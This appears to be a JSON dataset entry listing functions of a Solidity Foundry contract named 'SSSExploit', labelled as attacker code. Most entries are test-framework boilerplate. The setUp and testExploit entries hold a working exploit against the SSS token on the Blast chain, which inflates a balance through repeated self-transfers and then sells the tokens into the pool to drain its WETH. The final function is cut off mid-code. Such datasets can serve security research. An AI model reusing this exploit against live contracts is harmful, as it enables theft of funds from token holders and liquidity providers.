[
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"blast\", 1_110_245);\n        WETH.approve(address(ROUTER_V2), type(uint256).max);\n        SSS.approve(address(ROUTER_V2), type(uint256).max);\n        fundingToken = address(WETH);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SSSExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        //Emulate flashloan here with deal\n        vm.deal(address(this), 0);\n        vm.deal(address(this), ethFlashAmt);\n        WETH.deposit{value: ethFlashAmt}();\n\n        //Buy 1 eth of tokens\n        ROUTER_V2.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            ethFlashAmt, 0, getPath(true), address(this), block.timestamp\n        );\n\n        //Transfer to self until balance reaches target bal\n        uint256 targetBal = ROUTER_V2.getAmountsIn(WETH.balanceOf(POOL) - 29.5 ether, getPath(false))[0];\n        while (SSS.balanceOf(address(this)) < targetBal) {\n            SSS.transfer(address(this), SSS.balanceOf(address(this)));\n        }\n\n        //Burn excess tokens above target to avoid OVERFLOW error on swap on pair\n        SSS.burn(SSS.balanceOf(address(this)) - targetBal);\n        assertEq(SSS.balanceOf(address(this)), targetBal, \"we exceeded target\");\n\n        //Send balance of tokens to pair to swap in a loop,to avoid multiple swap calls\n        uint256 tokensLeft = targetBal;\n        uint256 maxAmountPerTx = SSS.maxAmountPerTx();\n        uint256 SBalBeforeOnPair = SSS.balanceOf(POOL);\n        while (tokensLeft > 0) {\n            uint256 toSell = tokensLeft > maxAmountPerTx ? maxAmountPerTx - 1 : tokensLeft;\n            SSS.transfer(POOL, toSell);\n            tokensLeft -= toSell;\n        }\n\n",
    "description": ""
  }
]